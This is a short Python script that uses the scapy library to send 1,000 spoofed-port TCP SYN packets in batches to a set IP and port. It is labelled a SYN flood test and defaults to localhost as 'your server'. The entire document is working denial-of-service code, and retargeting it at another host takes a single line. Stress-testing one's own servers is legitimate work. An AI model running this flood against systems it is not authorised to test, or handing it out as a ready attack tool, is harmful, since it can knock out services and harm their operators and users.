from scapy.all import IP, TCP, RandShort, send

TARGET_IP = "127.0.0.1"  # Your server's IP
TARGET_PORT = 8080        # Your server's port

for i in range(50):
    packets = [IP(dst=TARGET_IP) / TCP(dport=TARGET_PORT, sport=RandShort(), flags="S") for _ in range(20)]
    send(packets, verbose=1, inter=0.05)  # verbose=1 for confirmation
    print(f"SYN Flood batch {i+1}/50 sent (total packets: {(i+1)*20})")

print("SYN Flood test complete.")